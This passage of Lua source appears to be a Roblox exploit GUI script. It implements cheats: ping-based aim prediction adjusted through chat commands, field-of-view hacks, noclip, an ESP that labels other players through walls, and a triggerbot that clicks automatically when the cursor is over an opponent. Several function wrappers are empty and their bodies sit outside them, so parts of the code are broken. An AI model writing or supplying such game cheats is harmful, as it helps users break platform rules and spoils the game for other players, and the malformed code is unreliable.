					if L_115_arg0 == "/e P+" then
						_G.PRED = _G.PRED + 0.001
					end
				end
			)
			game.Players.LocalPlayer.Chatted:Connect(
				function(L_116_arg0)
					if L_116_arg0 == "/e P-" then
						_G.PRED = _G.PRED - 0.001
					end
				end
			)
			while wait() do
				if
					getClosestPlayerToCursor().Character.Humanoid.Jump == true and
					getClosestPlayerToCursor().Character.Humanoid.FloorMaterial == Enum.Material.Air
				then
					_G.Frame = Vector3.new(0, -2.3, 0)
					wait(0.05)
				else
					local L_117_ = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
					local L_118_ = tostring(L_117_)
					local L_119_ = L_118_:split(" ")
					local L_120_ = L_119_[1]
					L_79_ = L_120_ / 1000 + _G.PRED
					_G.Frame = Vector3.new(0, 0.53, 0)
				end
			end
		end
	)
end)
coroutine.wrap(XZWNN_fake_script)()
local function AQEJRXT_fake_script() -- FOV180.LocalScript 
	local script = Instance.new('LocalScript', FOV180)

	script.Parent.MouseButton1Click:Connect(function()
		workspace.CurrentCamera.FieldOfView = 180
	end) -- w mason made this
end
coroutine.wrap(AQEJRXT_fake_script)()
local function BZBB_fake_script() -- FOV180.LocalScript 
	local script = Instance.new('LocalScript', FOV180)

	toggle = false
	script.Parent.MouseButton1Down:connect(function()
	
		if toggle == true then 
			toggle = false 
		else
			toggle = true
		end
		if toggle == true then 
			script.Parent.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
		end
		if toggle == false then 
			script.Parent.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		end
	
		if toggle == true then
			--true here
		end
		if toggle == false then 
			--false here
		end
	end)
end
coroutine.wrap(BZBB_fake_script)()
local function YSZOQ_fake_script() -- FOV120.LocalScript 
	local script = Instance.new('LocalScript', FOV120)

	script.Parent.MouseButton1Click:Connect(function()
		workspace.CurrentCamera.FieldOfView = 120
	end) -- w mason made this
end
coroutine.wrap(YSZOQ_fake_script)()
local function YIEHANY_fake_script() -- FOV120.LocalScript 
	local script = Instance.new('LocalScript', FOV120)

	toggle = false
	script.Parent.MouseButton1Down:connect(function()
	
		if toggle == true then 
			toggle = false 
		else
			toggle = true
		end
		if toggle == true then 
			script.Parent.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
		end
		if toggle == false then 
			script.Parent.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		end
	
		if toggle == true then
			--true here
		end
		if toggle == false then 
			--false here
		end
	end)
end
coroutine.wrap(YIEHANY_fake_script)()
local function YDSOX_fake_script() -- FIV90.LocalScript 
	local script = Instance.new('LocalScript', FIV90)

	script.Parent.MouseButton1Click:Connect(function()
		workspace.CurrentCamera.FieldOfView = 90
	end) -- w mason made this
end
coroutine.wrap(YDSOX_fake_script)()
local function TNOEDXN_fake_script() -- FIV90.LocalScript 
	local script = Instance.new('LocalScript', FIV90)

	toggle = false
	script.Parent.MouseButton1Down:connect(function()
	
		if toggle == true then 
			toggle = false 
		else
			toggle = true
		end
		if toggle == true then 
			script.Parent.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
		end
		if toggle == false then 
			script.Parent.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		end
	
		if toggle == true then
			--true here
		end
		if toggle == false then 
			--false here
		end
	end)
end
coroutine.wrap(TNOEDXN_fake_script)()
		local function VKAC_fake_script() -- Nocli.LocalScript 
			
		end
	local script = Instance.new('LocalScript', Nocli)

	noclip = false
	game:GetService('RunService').Stepped:Connect(function()
		if noclip then
			game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
		end
	end)
	
	
	local p = game.Players.LocalPlayer
	local mo = p:GetMouse()
	
	mo.KeyDown:connect(function(k)
		if k == "e" then
			noclip = not noclip
			p.Character.Humanoid:ChangeState(11)
	end
end)
coroutine.wrap(VKAC_fake_script)()
		local function CFTKXUP_fake_script() -- Nocli.LocalScript 
			
		end
	local script = Instance.new('LocalScript', Nocli)

	script.Parent.MouseButton1Click:Connect(function()
	noclip = false
	game:GetService('RunService').Stepped:Connect(function()
		if noclip then
			game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
	
		end
	end)
	
	local p = game.Players.LocalPlayer
	local mo = p:GetMouse()
	
	mo.KeyDown:Connect(function(k)
		if k == 'e' then
			noclip = not noclip
			p.Character.Humanoid:ChangeState(11)
		end
	end)
end)
coroutine.wrap(CFTKXUP_fake_script)()
local function YHVFXMF_fake_script() -- Nocli.LocalScript 
	local script = Instance.new('LocalScript', Nocli)

	toggle = false
	script.Parent.MouseButton1Down:connect(function()
	
		if toggle == true then 
			toggle = false 
		else
			toggle = true
		end
		if toggle == true then 
			script.Parent.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
		end
		if toggle == false then 
			script.Parent.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		end
	
		if toggle == true then
			--true here
		end
		if toggle == false then 
			--false here
		end
	end)
end
coroutine.wrap(YHVFXMF_fake_script)()
local function ACCZVB_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)

	wait(4)
	
	game.StarterGui:SetCore("SendNotification",  {
	
		Title = "join the server";
		Text = "Link was copied";
		icon = "http://www.roblox.com/asset/?id=8109580830";
		Duration = "5";
	})
end
coroutine.wrap(ACCZVB_fake_script)()
local function CAWIEZ_fake_script() -- ESP.LocalScript 
	local script = Instance.new('LocalScript', ESP)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		script.Parent.Frame.Visible = true
		script.Parent.Parent.Main.Main.Visible = false
		script.Parent.Parent.Frame.backgroundcolor3 = Color3.fromRGB(0, 0, 0)
	end)
end
coroutine.wrap(CAWIEZ_fake_script)()
local function FJMUAXM_fake_script() -- Frame_2.LocalScript 
	local script = Instance.new('LocalScript', Frame_2)

	local UIS = game:GetService('UserInputService')
	local ESP = script.Parent
	local dragToggle = nil
	local d
	ragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(ESP, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	ESP.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = ESP.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end
coroutine.wrap(FJMUAXM_fake_script)()
local function QWQSKEG_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local d
	ragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end
coroutine.wrap(QWQSKEG_fake_script)()
local function OAYVFE_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	toggle = false
	script.Parent.MouseButton1Down:connect(function()
	
		if toggle == true then 
			toggle = false 
		else
			toggle = true
		end
		if toggle == true then 
			script.Parent.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
		end
		if toggle == false then 
			script.Parent.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		end
	
		if toggle == true then
			--true here
		end
		if toggle == false then 
			--false here
		end
	end)
end
coroutine.wrap(OAYVFE_fake_script)()
			local function EDFS_fake_script() -- TextButton.LocalScript 
				
			end
	local script = Instance.new('LocalScript', TextButton)

	script.Parent.MouseButton1Click:Connect(function()
	local esp_settings = { ---- table for esp settings 
		textsize = 8,
		colour = 255,255,255
	}
	
	local gui = Instance.new("BillboardGui")
	local esp = Instance.new("TextLabel",gui) ---- new instances to make the billboard gui and the textlabel
	
	
	
	gui.Name = "Cracked esp"; ---- properties of the esp
	gui.ResetOnSpawn = false
	gui.AlwaysOnTop = true;
	gui.LightInfluence = 0;
	gui.Size = UDim2.new(1.75, 0, 1.75, 0);
	esp.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
	esp.Text = ""
	esp.Size = UDim2.new(0.0001, 0.00001, 0.0001, 0.00001);
	esp.BorderSizePixel = 4;
	esp.BorderColor3 = Color3.new(esp_settings.colour)
	esp.BorderSizePixel = 0
	esp.Font = "GothamSemibold"
	esp.TextSize = esp_settings.textsize
	esp.TextColor3 = Color3.fromRGB(esp_settings.colour) -- text colour
	
	game:GetService("RunService").RenderStepped:Connect(function() ---- loops faster than a while loop :)
		for i,v in pairs (game:GetService("Players"):GetPlayers()) do
			if v ~= game:GetService("Players").LocalPlayer and v.Character.Head:FindFirstChild("Cracked esp")==nil  then -- craeting checks for team check, local player etc
				esp.Text = "{"..v.Name.."}"
				gui:Clone().Parent = v.Character.Head
			end
		end
	end)
end)
coroutine.wrap(EDFS_fake_script)()
local function KFEM_fake_script() -- TextButton_2.LocalScript 
	local script = Instance.new('LocalScript', TextButton_2)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Visible = false
	end)
end
coroutine.wrap(KFEM_fake_script)()
local function CYGHRI_fake_script() -- TextButton_3.LocalScript 
	local script = Instance.new('LocalScript', TextButton_3)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Visible = false
	end)
end
coroutine.wrap(CYGHRI_fake_script)()
				local function DOKA_fake_script() -- ESP.LocalScript 
					
				end
	local script = Instance.new('LocalScript', ESP)

	script.Parent.MouseButton1Click:Connect(function()
	toggle = false
	script.Parent.MouseButton1Down:connect(function()
	
		if toggle == true then 
			toggle = false 
		else
			toggle = true
		end
		if toggle == true then 
			script.Parent.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
		end
		if toggle == false then 
			script.Parent.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		end
	
		if toggle == true then
			--true here
		end
		if toggle == false then 
			--false here
		end
	end)
end)
coroutine.wrap(DOKA_fake_script)()
local function IAAZSNU_fake_script() -- Mainpart.LocalScript 
	local script = Instance.new('LocalScript', Mainpart)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		script.Parent.Main.Visible = true
		script.Parent.Parent.ESP.frame.Visible = false
		script.Parent.Parent.Main.backgroundcolor3 = Color3.fromRGB(0, 0, 0)
	end)
end
coroutine.wrap(IAAZSNU_fake_script)()
local function HESTT_fake_script() -- TextButton_4.LocalScript 
	local script = Instance.new('LocalScript', TextButton_4)

	toggle = false
	script.Parent.MouseButton1Down:connect(function()
	
		if toggle == true then 
			toggle = false 
		else
			toggle = true
		end
		if toggle == true then 
			script.Parent.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
		end
		if toggle == false then 
			script.Parent.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		end
	
		if toggle == true then
			--true here
		end
		if toggle == false then 
			--false here
		end
	end)
end
coroutine.wrap(HESTT_fake_script)()
local function HJGDKGC_fake_script() -- TextButton_4.LocalScript 
	local script = Instance.new('LocalScript', TextButton_4)

	local player = game:GetService("Players").LocalPlayer
	local mouse = player:GetMouse()
	game:GetService("RunService").RenderStepped:Connect(function()
		if mouse.Target.Parent:FindFirstChild("Humanoid") and mouse.Target.Parent.Name ~= player.Name then
			mouse1press() wait() mouse1release()
		end
	end)
end
coroutine.wrap(HJGDKGC_fake_script)()
local function KLFI_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)

	local Plr = game.Players.LocalPlayer
	
	Plr:GetMouse().KeyDown:Connect(function(K)
		if K == "v" then
			script.Parent.Visible = true
		end
	end)
	
	local Plr = game.Players.LocalPlayer
	
	Plr:GetMouse().KeyDown:Connect(function(K)
		if K == "e" then
			script.Parent.Visible = false
		end
	end)
end
coroutine.wrap(KLFI_fake_script)()
local function OFJFWPN_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)

	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end
coroutine.wrap(OFJFWPN_fake_script)()
